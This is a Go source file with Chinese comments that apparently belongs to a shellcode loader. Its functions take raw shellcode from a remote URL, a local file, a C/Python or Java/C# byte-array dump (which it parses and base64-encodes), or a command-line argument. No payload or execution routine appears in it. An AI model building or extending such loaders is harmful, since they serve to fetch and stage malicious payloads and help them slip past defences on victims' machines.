package server

import (
	"encoding/base64"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"strings"
)

//UriModel  远程模式
func UriModel() {
	resp, err := http.Get(Uri)
	defer resp.Body.Close()

	if err != nil {
		fmt.Println(err.Error())
		os.Exit(1)
	}
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		fmt.Println(err.Error())
		os.Exit(1)
	}
	ShellCodeByte = body
}

//ReadFileModel 读取本地文件模式
func ReadFileModel() {
	file, err := os.Open(FilePath)
	if err != nil {
		fmt.Println(err.Error())
		os.Exit(1)
	}
	body, err := ioutil.ReadAll(file)
	if err != nil {
		fmt.Println(err.Error())
		os.Exit(1)
	}
	ShellCodeByte = body
	defer file.Close()
}

//ResourceModel 原文件模式
func ResourceModel() {
	var str string
	file, err := os.Open(Resource)
	if err != nil {
		fmt.Println(err.Error())
		os.Exit(1)
	}
	fileByte, err := ioutil.ReadAll(file)
	if err != nil {
		fmt.Println(err.Error())
		os.Exit(1)
	}
	defer file.Close()
	fileStr := string(fileByte)
	if strings.Contains(fileStr, "{") {
		//这是Java和C#之流
		indexItem := strings.LastIndex(fileStr, "{")
		lastItem := strings.LastIndex(fileStr, "}")
		str = fileStr[indexItem+1 : lastItem]

		//之所以写这两段代码是为了防止 0x15a0x的出现，然后再去除空格
		str = strings.Replace(str, ", 0x", "", -1)
		str = strings.Replace(str, "0x", "", 1)
		str = strings.Replace(str, " ", "", -1)
	} else if strings.Contains(fileStr, "\\x") {
		//这是c、python之流
		indexItem := strings.Index(fileStr, "\"")
		lastItem := strings.LastIndex(fileStr, "\"")
		str = fileStr[indexItem+1 : lastItem]
		str = strings.Replace(str, "\\x", "", -1)
		str = strings.Replace(str, " ", "", -1)
	}
	str = base64.StdEncoding.EncodeToString([]byte(str))
	ShellCodeByte = []byte(str)
}

func CommLineModel() {
	ShellCodeByte = []byte(CommLineCode)
}
